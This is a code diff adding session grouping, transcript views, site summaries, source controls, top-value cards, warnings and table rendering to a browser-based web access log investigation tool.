+  ['entry', 'First request', s => s.ev[0] ? s.ev[0].path : '', s => s.ev[0] ? s.ev[0].path : '', 'm'],
+  ['site', 'Site', s => labelOf(s.sid, s.vhost || s.file), s => labelOf(s.sid, s.vhost || s.file)]
+];
+function sortSessions(rows, k, dir) {
+  const col = CV_COLS.find(c => c[0] === k) || CV_COLS[4], get = col[3];
+  return rows.sort((a, b) => { const x = get(a), y = get(b); return (x < y ? -1 : x > y ? 1 : 0) * dir || b.n - a.n; });
+}
+function renderConversations(rebuild) {
+  if (rebuild) { state.sessions = buildSessions(state.F, state.sessGap); state.cvPage = 0; }
+  const rows = sortSessions(state.sessions, state.cvSort.k, state.cvSort.dir), n = rows.length;
+  const PS = state.cvPageSize, pages = Math.max(1, Math.ceil(n / PS));
+  state.cvPage = clamp(state.cvPage, 0, pages - 1);
+  const order = colOrder('cv', CV_COLS);
+  $('cvHead').innerHTML = '<tr>' + order.map(ci => {
+    const [k, label, , , cls] = CV_COLS[ci], on = state.cvSort.k === k, arrow = on ? (state.cvSort.dir < 0 ? ' ↓' : ' ↑') : '';
+    return headCell('cv', ci, `${esc(label)}${arrow}`, cls === 'num' ? 'num' : '', ` aria-sort="${on ? (state.cvSort.dir < 0 ? 'descending' : 'ascending') : 'none'}"`,
+      'Click to sort. Drag to move. Drag the right edge to resize. Alt+Left/Right also moves.');
+  }).join('') + '</tr>';
+  applyColWidths('cv', $('cvHead'), CV_COLS);
+  const html = [], s0 = state.cvPage * PS;
+  for (let i = s0; i < Math.min(s0 + PS, n); i++) {
+    const s = rows[i];
+    html.push(`<tr tabindex="0" data-i="${i}"${s.rules ? ' class="hit"' : ''}>` + order.map(ci => { const [, , fn, , cls] = CV_COLS[ci], v = fn(s); return `<td class="${cls || ''}" title="${esc(v)}">${esc(v)}</td>`; }).join('') + '</tr>');
+  }
+  $('cvBody').innerHTML = html.join('') || `<tr><td colspan="${CV_COLS.length}" class="muted">No timestamped requests in this selection.</td></tr>`;
+  const sortName = (CV_COLS.find(c => c[0] === state.cvSort.k) || [, 'Requests'])[1];
+  $('cvInfo').textContent = n
+    ? `${fmtN(n)} conversations (same client, user agent and site; a new one starts after ${state.sessGap} minutes idle), sorted by ${sortName.toLowerCase()}${state.cvSort.dir < 0 ? ' (highest first)' : ' (lowest first)'}.`
+    : '';
+  $('cvPageInfo').textContent = n ? `Rows ${fmtN(s0 + 1)} to ${fmtN(Math.min(s0 + PS, n))} of ${fmtN(n)}` : '0 rows';
+  $('cvPrev').disabled = state.cvPage === 0;
+  $('cvNext').disabled = state.cvPage >= pages - 1;
+  $('cvExport').disabled = !n;
+  state.cvRows = rows;
+}
+function relTime(ms) { const s = Math.round(ms / 1000); return s < 3600 ? `+${Math.floor(s / 60)}:${pad(s % 60)}` : `+${Math.floor(s / 3600)}:${pad(Math.floor(s % 3600 / 60))}:${pad(s % 60)}`; }
+// Transcript columns: [label, cell(o, s, prevTime) -> [html, hoverText], class, default width px (0 = takes the rest)]
+const TR_COLS = [
+  ['Elapsed', (o, s) => [esc(relTime(o.$t - s.first)), ''], 'm', 72],
+  ['Gap', (o, s, prev) => { const g = o.$t - prev; return [g >= 1000 ? esc(fmtDur(g)) : '', '']; }, 'm num', 64],
+  ['Method', o => [esc(o.method), ''], '', 76],
+  ['URL', o => { const u = urlOf(o) || o.request; return [esc(u), u]; }, 'm url', 0],
+  ['Status', o => [`<span class="sc sc-${esc(o.$sc)}">${esc(o.status)}</span>`, ''], '', 74],
+  ['Bytes', o => [esc(fmtBytes(Number(o.bytes) || 0)), ''], 'num', 84],
+  ['Time', o => [o.$rt !== undefined ? esc(fmtMs(o.$rt)) : '', ''], 'num', 74],
+  ['Referer', o => { const r = o.referer && o.referer !== '-' ? o.referer : ''; return [esc(r), r]; }, 'ref', 170],
+  ['Patterns', o => [o.$rules ? o.$rules.map(r => ruleChip(r)).join('') : '', o.$rules ? o.$rules.map(r => RULE_NAME[r]).join(', ') : ''], 'pat', 210]
+];
+function openConversation(s, keepScroll) {
+  hideRuleTip(true);
+  const scroll = keepScroll ? $('drawer').scrollTop : 0;
+  state.curSession = s; state.cur = null;
+  const max = 2000, ev = s.ev.slice(0, max);
+  const statusMix = Object.entries(s.sc).filter(([, n]) => n).map(([k, n]) => `${k} ${fmtN(n)}`).join(', ');
+  const order = colOrder('tr', TR_COLS), cs = colState('tr');
+  const headHtml = order.map(ci => {
+    const [label, , cls, w] = TR_COLS[ci];
+    return headCell('tr', ci, esc(label), cls.includes('num') ? 'num' : '', !cs.w && w ? ` style="width:${w}px"` : '',
+      'Drag to move. Drag the right edge to resize. Alt+Left/Right also moves.');
+  }).join('');
+  const rowsHtml = ev.map((o, i) => {
+    const prev = i ? ev[i - 1].$t : o.$t;
+    return `<tr data-i="${i}"${isHit(o) ? ' class="hit"' : ''}>` + order.map(ci => {
+      const [, fn, cls] = TR_COLS[ci], [h, t] = fn(o, s, prev);
+      return `<td class="${cls}"${t ? ` title="${esc(t)}"` : ''}>${h}</td>`;
+    }).join('') + '</tr>';
+  }).join('');
+  $('drawer').innerHTML = `<header><h2>Conversation</h2><button class="btn small" type="button" data-act="close">Close</button></header>
+    <p class="cv-who mono">${esc(s.client)}</p>
+    <dl class="cv-meta">
+      <dt>User agent</dt><dd>${esc(s.ua || '(none)')}</dd>
+      <dt>Site</dt><dd>${esc(labelOf(s.sid, s.vhost || s.file))}</dd>
+      <dt>When</dt><dd>${esc(fmtTime(s.first))} to ${esc(fmtTime(s.last))} (${esc(tzLabel())}), ${esc(fmtDur(s.last - s.first))}</dd>
+      <dt>Requests</dt><dd>${fmtN(s.n)} across ${fmtN(s.paths.size)} paths; ${esc(statusMix)}; ${esc(fmtBytes(s.bytes))}</dd>
+      ${s.users.size ? `<dt>Users</dt><dd>${esc([...s.users].join(', '))}</dd>` : ''}
+      <dt>Methods</dt><dd>${esc([...s.methods].join(', '))}</dd>
+    </dl>
+    <div class="dacts">
+      <button class="btn small" type="button" data-act="cvfilter">Filter to this conversation</button>
+      <button class="btn small" type="button" data-act="cvclient">This client, all conversations</button>
+      <button class="btn small" type="button" id="trColReset" title="Restore the default column order and widths">Reset columns</button>
+    </div>
+    <p class="hint" style="margin-bottom:6px">Read it top to bottom: what the client asked for first, where the responses changed, and what it did after anything unusual. Rows with pattern matches are marked; hover over a badge to see why. Click a row for the full request. Drag a column header to move it, or its right edge to resize.</p>
+    <div class="transcript"><table class="ev tr"><thead id="trHead"><tr>${headHtml}</tr></thead><tbody>${rowsHtml}</tbody></table></div>
+    ${s.n > max ? `<p class="hint">Showing the first ${fmtN(max)} of ${fmtN(s.n)} requests. Use Filter to this conversation to page through the rest in the events table.</p>` : ''}`;
+  applyColWidths('tr', $('trHead'), TR_COLS);
+  setupColumns('tr', 'trHead', TR_COLS, () => openConversation(state.curSession, true), 'trColReset');
+  $('drawer').hidden = false; $('drawer').classList.add('wide');
+  if (keepScroll) $('drawer').scrollTop = scroll; else $('drawer').querySelector('[data-act="close"]').focus();
+}
+function sessionTokens(s) {
+  const t = [makeToken('ip', s.client), makeToken('ua', s.ua)];
+  if (s.vhost) t.push(makeToken('vhost', s.vhost));
+  return t;
+}
+function findSessionFor(o) {
+  const key = o.client + '\u0000' + (o.ua || '') + '\u0000' + (o.vhost || ''), gap = state.sessGap * 6e4;
+  const same = state.events.filter(x => x.client === o.client && (x.ua || '') === (o.ua || '') && (x.vhost || '') === (o.vhost || '') && x.$t === x.$t);
+  let i = same.indexOf(o); if (i < 0) return null;
+  let a = i, b = i;
+  while (a > 0 && same[a].$t - same[a - 1].$t <= gap) a--;
+  while (b < same.length - 1 && same[b + 1].$t - same[b].$t <= gap) b++;
+  return buildSessions(same.slice(a, b + 1), state.sessGap)[0] || null;
+}
+function exportConversations() {
+  const rows = state.cvRows || []; if (!rows.length) return;
+  const iso = t => isFinite(t) ? new Date(t).toISOString() : '';
+  const head = ['start_utc', 'end_utc', 'duration_s', 'client', 'user_agent', 'site', 'requests', 'distinct_paths', 'status_2xx', 'status_3xx', 'status_4xx', 'status_5xx', 'bytes', 'pattern_hits', 'users', 'methods', 'first_path', 'last_path'];
+  const out = [head.join(',') + '\n']; let buf = [];
+  for (const s of rows) {
+    buf.push([iso(s.first), iso(s.last), Math.round((s.last - s.first) / 1000), s.client, s.ua, s.vhost || s.file, s.n, s.paths.size,
+      s.sc['2xx'], s.sc['3xx'], s.sc['4xx'], s.sc['5xx'], s.bytes, s.rules, [...s.users].join(' '), [...s.methods].join(' '),
+      s.ev[0] ? s.ev[0].path : '', s.ev.length ? s.ev[s.ev.length - 1].path : ''].map(csvCell).join(','));
+    if (buf.length >= 5000) { out.push(buf.join('\n') + '\n'); buf = []; }
+  }
+  if (buf.length) out.push(buf.join('\n') + '\n');
+  download(`web-conversations-${stampName()}.csv`, out, 'text/csv');
+}
+
+/* ================= sites ================= */
+function computeSites() {
+  const map = new Map();
+  for (let i = 0; i < state.events.length; i++) {
+    const o = state.events[i], key = o.vhost !== undefined ? 'v\u0000' + o.vhost : 'f\u0000' + o.$f;
+    let d = map.get(key);
+    if (!d) map.set(key, d = { sid: sourceIdFor(key), vhost: o.vhost, file: o.$file, files: new Set(), clients: new Set(), fmts: new Set(), ext: new Map(), uas: new Map(), n: 0, authed: 0, wp: 0, lo: Infinity, hi: -Infinity, rt: 0 });
+    d.n++; d.files.add(o.$f); d.fmts.add(o.$fmt); o.$srcId = d.sid;
+    if (d.clients.size < 200000) d.clients.add(o.client);
+    if (o.$ext) d.ext.set(o.$ext, (d.ext.get(o.$ext) || 0) + 1);
+    if (o.ua !== undefined && (d.uas.size < 2000 || d.uas.has(o.ua))) d.uas.set(o.ua, (d.uas.get(o.ua) || 0) + 1);
+    if (o.user && o.user !== '-') d.authed++;
+    if (/^\/wp-(content|includes)\//.test(o.path)) d.wp++;
+    if (o.$rt !== undefined) d.rt++;
+    const t = o.$t; if (t === t) { if (t < d.lo) d.lo = t; if (t > d.hi) d.hi = t; }
+  }
+  const sites = [...map.values()].sort((a, b) => b.n - a.n);
+  for (const d of sites) {
+    const notes = d.notes = [];
+    const ext = k => d.ext.get(k) || 0;
+    if (ext('p') || ext('w') || ext('r')) notes.push('Progress OpenEdge ABL procedures (.p/.w/.r) are being served, so the application runs on WebSpeed or PAS for OpenEdge.');
+    if (ext('php')) notes.push(`PHP scripts are served (${fmtN(ext('php'))} requests).`);
+    if (ext('aspx') || ext('ashx') || ext('asmx') || ext('axd')) notes.push('ASP.NET endpoints are served (.aspx/.ashx/.asmx/.axd).');
+    if (ext('jsp') || ext('do') || ext('action')) notes.push('Java web endpoints are served (.jsp/.do/.action).');
+    if (d.wp >= 20) notes.push('WordPress assets are served (/wp-content, /wp-includes).');
+    const topUa = [...d.uas.entries()].sort((a, b) => b[1] - a[1])[0];
+    if (topUa && topUa[1] / d.n >= 0.5) notes.push(`${Math.round(topUa[1] / d.n * 100)}% of requests come from one user agent ("${topUa[0]}"), which suggests an integration or API consumer rather than browsers.`);
+    if (!d.authed) notes.push('No request carries an authenticated user (the user field is "-" throughout), so any authentication is not happening at the web server layer.');
+    d.tokens = d.vhost !== undefined ? [makeToken('vhost', d.vhost)] : [makeToken('file', d.file), 'vhost=""'];
+  }
+  state.sites = sites;
+}
+function renderSites() {
+  const sites = state.sites;
+  $('siteHead').textContent = sites.length > 1 ? `Sites in these logs (${sites.length})` : 'Site in these logs';
+  $('sites').innerHTML = sites.slice(0, 12).map(d => {
+    const name = d.vhost !== undefined ? d.vhost : 'Site not named in logs';
+    const files = [...d.files].map(i => state.files[i]).join(', ');
+    return `<div class="dev">
+      ${sourceCardHead(d.sid, name, d.vhost === undefined)}
+      <p class="dclass" title="${esc(files)}"><span class="sid" title="Source id, usable in filters: source=${d.sid}">${d.sid}</span>${esc(files)}</p>
+      <dl>
+        <dt>Requests</dt><dd>${fmtN(d.n)}</dd>
+        <dt>Clients</dt><dd>${d.clients.size >= 200000 ? '200,000+' : fmtN(d.clients.size)}</dd>
+        <dt>Time span</dt><dd>${isFinite(d.lo) ? `${esc(fmtTime(d.lo))} to ${esc(fmtTime(d.hi))}` : 'no timestamps'}</dd>
+        <dt>Format</dt><dd>${esc([...d.fmts].join('; '))}</dd>
+        <dt>Response time</dt><dd>${d.rt ? `${fmtN(d.rt)} requests, ${esc(rtDesc())}` : 'not available'}</dd>
+      </dl>
+      ${d.notes.length ? `<ul class="dnotes">${d.notes.map(x => `<li>${esc(x)}</li>`).join('')}</ul>` : ''}
+      ${sourceCardActions(d.sid, sites.length > 1, 'Filter to this Site', d.n)}
+    </div>`;
+  }).join('') + (sites.length > 12 ? `<p class="none">${fmtN(sites.length - 12)} more sites not shown. Use the Site top values below.</p>` : '');
+}
+
+
+/* ---------- log source controls: rename, filter, exclude, unload ---------- */
+// Source ids (S1, S2 ...) are stable for the session, so filters keep working after a rename or an unload.
+function sourceIdFor(key) { let id = state.srcIds.get(key); if (!id) { id = 'S' + (++state.srcSeq); state.srcIds.set(key, id); } return id; }
+const labelOf = (sid, fallback) => state.labels.get(sid) || fallback;
+function sourceCardHead(sid, original, placeholder) {
+  const label = state.labels.get(sid);
+  if (state.renaming === sid) return `<div class="dhead"><input class="rename-in" type="text" maxlength="80" value="${escA(label || (placeholder ? '' : original))}" placeholder="${escA(original)}" aria-label="Custom name for ${escA(sid)}" data-sid="${escA(sid)}">
+      <button class="btn small" type="button" data-act="rename-save" data-sid="${escA(sid)}">Save</button><button class="btn small" type="button" data-act="rename-cancel" data-sid="${escA(sid)}">Cancel</button></div>
+      <p class="renamed">Leave empty to go back to the name from the logs.</p>`;
+  return `<div class="dhead"><p class="dmodel${label || !placeholder ? '' : ' placeholder'}">${esc(label || original)}</p>
+      <button class="btn small ghost" type="button" data-act="rename" data-sid="${escA(sid)}" title="Give this source your own name. It is used across this page and in the case summary.">Rename</button></div>
+      ${label ? `<p class="renamed">Renamed by you; name in the logs: ${esc(original)}</p>` : ''}`;
+}
+function sourceCardActions(sid, many, filterLabel, n) {
+  // Always shown, even with a single source: both are ordinary filter chips and are undone by removing the chip.
+  return `<div class="dacts src-acts">
+    <button class="btn small" type="button" data-act="src-filter" data-sid="${escA(sid)}" title="Show only this ${escA(SRC.noun)}'s ${escA(SRC.unit)} (adds a source=${escA(sid)} filter)">Show only</button>
+    <button class="btn small" type="button" data-act="src-exclude" data-sid="${escA(sid)}" title="Hide this ${escA(SRC.noun)}'s ${escA(SRC.unit)} from every view (adds a source!=${escA(sid)} filter). Remove the chip to bring them back.">Exclude</button>
+    <button class="btn small danger" type="button" data-act="src-unload" data-sid="${escA(sid)}" title="Remove this ${escA(SRC.noun)}'s ${fmtN(n)} ${escA(SRC.unit)} from this session">Unload…</button>
+  </div>`;
+}
+function saveRename(sid, raw) {
+  const d = SRC.list().find(x => x.sid === sid); if (!d) return;
+  const v = String(raw || '').replace(/\s+/g, ' ').trim().slice(0, 80);
+  if (v && v !== SRC.original(d)) state.labels.set(sid, v); else state.labels.delete(sid);
+  state.renaming = null;
+  SRC.render(); applyFilters({ keepC: true });       // labels also appear in tables and the summary
+}
+function unloadSource(sid) {
+  const d = SRC.list().find(x => x.sid === sid); if (!d) return;
+  const name = labelOf(sid, SRC.original(d));
+  if (!confirm(`Unload "${vis(name)}" (${sid})?\n\nIts ${fmtN(d.n)} ${SRC.unit} are removed from this session. The file stays listed with its hash, and the case summary records the unload. Load the file again to bring them back.`)) return;
+  const keep = []; let removed = 0;
+  for (const o of state.events) {
+    if (o.$srcId === sid) {
+      removed++;
+      const fc = state.fileFmts[o.$f]; if (fc[o.$fmt] > 1) fc[o.$fmt]--; else delete fc[o.$fmt];
+      state.fileUnloaded[o.$f] = (state.fileUnloaded[o.$f] || 0) + 1;
+    } else keep.push(o);
+  }
+  state.events = keep;
+  state.unloaded.push({ sid, name, n: removed, files: SRC.files(d) });
+  state.labels.delete(sid);
+  const re = new RegExp(`^-?source!?=${sid}$`, 'i');
+  state.tokens = state.tokens.filter(t => !re.test(t)); $('q').value = state.tokens.join(' ');
+  state.noTime = 0; state.noTz = 0;
+  for (const o of keep) { if (isNaN(o.$t)) state.noTime++; if (o.$ntz) state.noTz++; }
+  closeDrawer();
+  if (!keep.length) { resetAll(); return; }
+  if (SRC.recompute) SRC.recompute();
+  SRC.render(); applyFilters();
+}
+function unloadedNotes() {
+  return state.unloaded.map(u => `Unloaded from this session: ${u.name} (${u.sid}), ${fmtN(u.n)} ${SRC.unit} from ${u.files}.`);
+}
+function setupSourceCards(containerId) {
+  const box = $(containerId);
+  box.addEventListener('click', e => {
+    const b = e.target.closest('button[data-act]'); if (!b) return;
+    const sid = b.dataset.sid, act = b.dataset.act;
+    if (act === 'rename') {
+      state.renaming = sid; SRC.render();
+      const inp = box.querySelector(`input.rename-in[data-sid="${sid}"]`); if (inp) { inp.focus(); inp.select(); }
+    } else if (act === 'rename-save') saveRename(sid, box.querySelector(`input.rename-in[data-sid="${sid}"]`).value);
+    else if (act === 'rename-cancel') { state.renaming = null; SRC.render(); }
+    else if (act === 'src-filter') addTokens([`source=${sid}`]);
+    else if (act === 'src-exclude') addTokens([`source!=${sid}`]);
+    else if (act === 'src-unload') unloadSource(sid);
+  });
+  box.addEventListener('keydown', e => {
+    const inp = e.target.closest('input.rename-in'); if (!inp) return;
+    if (e.key === 'Enter') { e.preventDefault(); saveRename(inp.dataset.sid, inp.value); }
+    else if (e.key === 'Escape') { e.preventDefault(); e.stopPropagation(); state.renaming = null; SRC.render(); }
+  });
+}
+const SRC = { list: () => state.sites, original: d => d.vhost !== undefined ? d.vhost : 'Site not named in logs',
+  files: d => [...d.files].map(i => state.files[i]).join(', '), render: renderSites, recompute: computeSites, unit: 'requests', noun: 'site' };
+
+/* ================= top values ================= */
+const TOP_FIELDS = [
+  ['client', 'Client IP'], ['path', 'Path'], ['status', 'Status'], ['method', 'Method'],
+  ['ua', 'User agent'], ['$rules', 'Pattern matches'], ['$refhost', 'Referring site'], ['user', 'Authenticated user'],
+  ['$ext', 'File type'], ['$qkeys', 'Query parameter'], ['vhost', 'Site (vhost)'], ['$fmt', 'Log format']
+];
+function topK(map, k) {
+  const out = [];
+  for (const [v, n] of map) {
+    if (out.length < k) { out.push([v, n]); out.sort((a, b) => b[1] - a[1]); }
+    else if (n > out[k - 1][1]) { out[k - 1] = [v, n]; out.sort((a, b) => b[1] - a[1]); }
+  }
+  return out;
+}
+function renderTops() {
+  const F = state.F, maps = TOP_FIELDS.map(() => new Map());
+  for (let i = 0; i < F.length; i++) {
+    const o = F[i];
+    for (let j = 0; j < TOP_FIELDS.length; j++) {
+      const f = TOP_FIELDS[j][0], v = o[f];
+      if (v === undefined || v === '' || (f === 'user' && v === '-')) continue;
+      const m = maps[j];
+      if (Array.isArray(v)) for (const x of v) m.set(x, (m.get(x) || 0) + 1);
+      else m.set(v, (m.get(v) || 0) + 1);
+    }
+  }
+  const total = F.length || 1, html = [];
+  TOP_FIELDS.forEach(([f, label], j) => {
+    const m = maps[j]; if (!m.size) return;
+    const rows = topK(m, 10), max = rows[0][1];
+    const tokField = f === '$fmt' ? 'format' : f;
+    html.push(`<div class="tcard"><header><h3>${esc(label)}</h3><span>${fmtN(m.size)} distinct</span></header>` +
+      rows.map(([v, n]) => {
+        const note = f === '$rules' ? RULE_NAME[v] : '';
+        const shown = f === '$rules' ? v : v;
+        return `<button class="trow" type="button" data-f="${escA(tokField)}" data-v="${escA(v)}" title="${esc(v)}: ${fmtN(n)} (${(n / total * 100).toFixed(1)}%)">
+          <span class="bar" style="width:${(n / max * 100).toFixed(1)}%"></span>
+          <span class="v">${esc(shown)}${note ? `<small>${esc(note)}</small>` : ''}</span><span class="n">${fmtN(n)}</span></button>`;
+      }).join('') + '</div>');
+  });
+  $('tops').innerHTML = html.join('') || '<p class="none">No values to summarise in this selection.</p>';
+}
+
+/* ================= status, chips, leads rendering ================= */
+function getWarnings() {
+  const w = [];
+  if (state.longLines) w.push(`${fmtN(state.longLines)} line${state.longLines === 1 ? ' was' : 's were'} longer than ${fmtN(MAX_LINE)} characters and not parsed. Access log lines are far shorter, so treat the file as corrupt or tampered until explained.`);
+  if (state.skipped) w.push(`${fmtN(state.skipped)} line${state.skipped === 1 ? ' was' : 's were'} not recognised as Apache-style access log lines and skipped.`);
+  if (state.w3c) w.push(`${fmtN(state.w3c)} W3C header line${state.w3c === 1 ? '' : 's'} (#Fields, #Software) found. That is IIS or W3C extended format, which this tool does not parse.`);
+  if (state.noTime) w.push(`${fmtN(state.noTime)} request${state.noTime === 1 ? ' has' : 's have'} no usable timestamp; they appear in the table but not the chart or conversations.`);
+  if (state.noTz) w.push(`${fmtN(state.noTz)} timestamp${state.noTz === 1 ? '' : 's'} had no UTC offset and were read as UTC. Check the server's time zone before building a timeline.`);
+  if (state.truncated) w.push(`Memory cap reached: ${fmtN(state.truncated)} further requests were not loaded. Split the file or narrow it at source.`);
+  for (const e of state.fileErrors) w.push(`Could not read ${e}`);
+  return w;
+}
+function renderStatus() {
+  const F = state.F, total = state.events.length;
+  let lo = NaN, hi = NaN;
+  for (let i = 0; i < F.length; i++) if (isFinite(F[i].$t)) { lo = F[i].$t; break; }
+  for (let i = F.length - 1; i >= 0; i--) if (isFinite(F[i].$t)) { hi = F[i].$t; break; }
+  const lines = [`<p class="st-count">${fmtN(F.length)} of ${fmtN(total)} requests shown, from ${fmtN(state.files.length)} file${state.files.length === 1 ? '' : 's'}</p>`,
+    `<p class="st-range"><span class="st-label">Detected time range:</span> ${isFinite(lo) ? `${esc(fmtTime(lo))} to ${esc(fmtTime(hi))} <span class="muted">(${esc(tzLabel())})</span>` : '<span class="muted">no timestamped requests in this selection</span>'}</p>`];
+  const rows = ['<span class="if-h">File</span><span class="if-h">Format</span><span class="if-h if-n">Requests</span><span class="if-h">SHA-256</span>'];
+  state.files.forEach((f, i) => {
+    const c = Object.entries(state.fileFmts[i] || {});
+    const hash = `<span class="if-hash" title="SHA-256 of the file bytes as loaded">${esc(state.fileHash[i] || 'not computed')}</span>`;
+    if (!c.length) rows.push(`<span class="if-name">${esc(f)}</span><span class="if-fmt${state.fileUnloaded[i] ? '' : ' warn'}">${state.fileUnloaded[i] ? 'Nothing left loaded' : 'No recognised lines'}</span><span class="if-n">0</span>${hash}`);
+    c.forEach(([k, n], j) => rows.push(`<span class="if-name">${esc(f)}</span><span class="if-fmt">${esc(k)}</span><span class="if-n">${fmtN(n)}</span>${j === 0 ? hash : '<span></span>'}`));
+    if (state.fileUnloaded[i]) rows.push(`<span class="if-name">${esc(f)}</span><span class="if-fmt">Unloaded by you</span><span class="if-n">${fmtN(state.fileUnloaded[i])}</span><span></span>`);
+  });
+  lines.push(`<div class="ingested"><h3>Ingested log files</h3><div class="if-grid">${rows.join('')}</div></div>`);
+  if (state.extras.length) {
+    const fieldOpts = [['auto', `Automatic (${state.rtFieldAuto || 'none suitable'})`]].concat(state.extras.map(e => [e.name, e.name]), [['none', 'None']]);
+    const unitOpts = [['auto', `Automatic (${RT_LABEL[state.rtAuto]})`], ['us', RT_LABEL.us], ['ms', RT_LABEL.ms], ['s', RT_LABEL.s]];
+    const assumed = state.rtField === 'auto' || state.rtMode === 'auto';
+    lines.push(`<div class="ingested rtline"><h3>Extra fields</h3>
+      <p>${state.extras.map(e => `<span class="mono">${e.name}</span> on ${fmtN(e.n)} line${e.n === 1 ? '' : 's'} (e.g. <span class="mono">${esc(e.samples.join(', '))}</span>)`).join('; ')}.</p>
+      <p><label>Response time field <select id="rtField">${fieldOpts.map(([v, l]) => `<option value="${v}"${state.rtField === v ? ' selected' : ''}>${esc(l)}</option>`).join('')}</select></label>
+      <label>Unit <select id="rtMode">${unitOpts.map(([v, l]) => `<option value="${v}"${state.rtMode === v ? ' selected' : ''}>${esc(l)}</option>`).join('')}</select></label></p>
+      <p class="hint">In use: ${esc(rtDesc())}. ${assumed ? 'Automatic choices are assumptions from the values, not facts. Confirm against the server\'s LogFormat (Apache) or log_format (nginx) line before relying on response times.' : 'Set by you; the case summary records it.'}</p></div>`);
+  }
+  for (const x of unloadedNotes()) lines.push(`<div class="note">${esc(x)}</div>`);
+  for (const x of getWarnings()) lines.push(`<div class="warn">${esc(x)}</div>`);
+  if (state.skippedSamples.length) lines.push(`<details class="skipped"><summary>Show the first unrecognised lines</summary><pre>${esc(state.skippedSamples.join('\n'))}</pre></details>`);
+  $('status').innerHTML = lines.join('');
+}
+function renderChips() {
+  const h = state.tokens.map((t, i) => `<span class="chip${t.includes('!=') || t.startsWith('-') ? ' neg' : ''}">${esc(t)}<button type="button" data-i="${i}" aria-label="Remove ${esc(t)}">×</button></span>`);
+  if (state.range) h.push(`<span class="chip time">${esc(fmtTime(state.range[0]))} to ${esc(fmtTime(state.range[1]))}<button type="button" data-range="1" aria-label="Clear time range">×</button></span>`);
+  if (state.filterError) h.push(`<span class="ferr">Ignored: ${esc(state.filterError)}</span>`);
+  $('chips').innerHTML = h.join('');
+}
+function renderFindings() {
+  const L = computeLeads(state.F);
+  $('findings').innerHTML = L.length ? L.map(f => `<div class="finding ${f.level}">
+      <header><h3>${esc(f.title)}</h3><span class="lvl">${f.level === 'first' ? 'Look first' : 'Review'}</span>${f.how ? `<span class="rule info" tabindex="0" aria-label="How this is decided">How this is decided<span class="rtip" role="tooltip">${esc(f.how)}</span></span>` : ''}</header>
+      <p class="why">${esc(f.why)}${(f.refs || []).length ? ` <span class="lead-refs">${f.refs.map(refLink).join(' ')}</span>` : ''}</p>
+      ${f.rows.map(r => `<button class="frow" type="button" data-t="${escA(JSON.stringify(r.t))}"><span class="k">${esc(r.k)}</span><span class="d">${esc(r.d)}</span></button>`).join('')}
+    </div>`).join('')
+    : '<p class="none">No leads from the built-in checks in this selection. These checks are narrow, so no lead is not the same as no problem.</p>';
+}
+
+/* ================= events table ================= */
+const COLS = [
+  ['Time', o => fmtTime(o.$t), 'm'],
+  ['Client', o => o.client, 'm'],
+  ['User', o => o.user === '-' ? '' : o.user],
+  ['Method', o => o.method],
+  ['Path', o => o.path || (o.method === '(malformed)' ? o.request : ''), 'm'],
+  ['Query', o => o.query || '', 'm'],
+  ['Status', o => o.status, 'st'],
+  ['Bytes', o => fmtN(Number(o.bytes) || 0), 'num'],
+  ['Resp. time', o => o.$rt === undefined ? '' : fmtMs(o.$rt), 'num'],
+  ['Referer', o => o.referer && o.referer !== '-' ? o.referer : ''],
+  ['User agent', o => o.ua || ''],
+  ['Patterns', o => o.$rules ? o.$rules.map(r => RULE_NAME[r]).join(', ') : '', 'pat'],
+  ['Site', o => o.vhost || '']
+];
+function renderTable() {
+  hideRuleTip(true);
+  const F = state.F, n = F.length, PAGE = state.pageSize, pages = Math.max(1, Math.ceil(n / PAGE));
+  state.page = clamp(state.page, 0, pages - 1);
+  const order = colOrder('ev', COLS);
+  $('evHead').innerHTML = '<tr>' + order.map(ci => {
+    const h = COLS[ci][0];
+    return headCell('ev', ci, `${esc(h)}${h === 'Time' ? ` <span class="muted">(${esc(tzLabel())})</span>` : ''}`, COLS[ci][2] === 'num' ? 'num' : '', '',
+      'Drag to move. Drag the right edge to resize. Alt+Left/Right also moves.');
+  }).join('') + '</tr>';
+  applyColWidths('ev', $('evHead'), COLS);
+  const rows = [], s = state.page * PAGE;
+  for (let k = 0; k < PAGE; k++) {
+    const pos = s + k; if (pos >= n) break;
+    const idx = state.newestFirst ? n - 1 - pos : pos, o = F[idx];
+    rows.push(`<tr tabindex="0" data-i="${idx}"${isHit(o) ? ' class="hit"' : ''}>` + order.map(ci => {
+      const [, fn, cls] = COLS[ci], v = fn(o);
+      if (cls === 'st') return `<td><span class="sc sc-${esc(o.$sc)}">${esc(v)}</span></td>`;
+      if (cls === 'pat') return `<td class="pat" title="${esc(v)}">${o.$rules ? o.$rules.map(r => ruleChip(r)).join('') : ''}</td>`;
+      return `<td${cls ? ` class="${cls}"` : ''} title="${esc(v)}">${esc(v)}</td>`;
+    }).join('') + '</tr>');
+  }
+  $('evBody').innerHTML = rows.join('') || `<tr><td colspan="${COLS.length}" class="muted">No requests match. Remove a filter above or clear the time range.</td></tr>`;
+  $('pageInfo').textContent = n ? `Rows ${fmtN(s + 1)} to ${fmtN(Math.min(s + PAGE, n))} of ${fmtN(n)}` : '0 rows';
+  $('prevBtn').disabled = state.page === 0;
+  $('nextBtn').disabled = state.page >= pages - 1;
+  $('sortBtn').textContent = state.newestFirst ? 'Newest first' : 'Oldest first';
+  $('exportBtn').disabled = !n;
+}
+const colState = k => state.tbl[k];
+const colOrder = (k, cols) => colState(k).order || cols.map((_, i) => i);
+function headCell(k, ci, inner, cls, extraAttrs, title) {
+  const cs = colState(k), w = cs.w ? ` style="width:${cs.w[ci]}px"` : '';
+  return `<th data-c="${ci}" draggable="true" tabindex="0"${w} class="${cls || ''}"${extraAttrs || ''} title="${escA(title)}">${inner}<span class="rs" aria-hidden="true"></span></th>`;
+}
+function applyColWidths(k, head, cols) {
+  const t = head.closest('table'), cs = colState(k);
+  if (!cs.w) { t.classList.remove('fixed'); t.style.width = ''; return; }
+  t.classList.add('fixed');
+  t.style.width = colOrder(k, cols).reduce((a, ci) => a + cs.w[ci], 0) + 'px';
+}
+// Resize by the right-edge grip, move by drag (or Alt+Left/Right), optional activate (click / Enter / Space).
+function setupColumns(k, headId, cols, render, resetId, onActivate) {
+  const head = $(headId), cs = colState(k);
+  let rs = null, dragC = null, justResized = false;
+  const clearMarks = () => head.querySelectorAll('th').forEach(th => th.classList.remove('drop-before', 'drop-after', 'dragging'));
+  const moveCol = (from, to, after) => {
+    const order = colOrder(k, cols).filter(c => c !== from);
+    let at = order.indexOf(to); if (at < 0) return; if (after) at++;
+    order.splice(at, 0, from); cs.order = order; render();
+  };
+  head.addEventListener('pointerdown', e => {
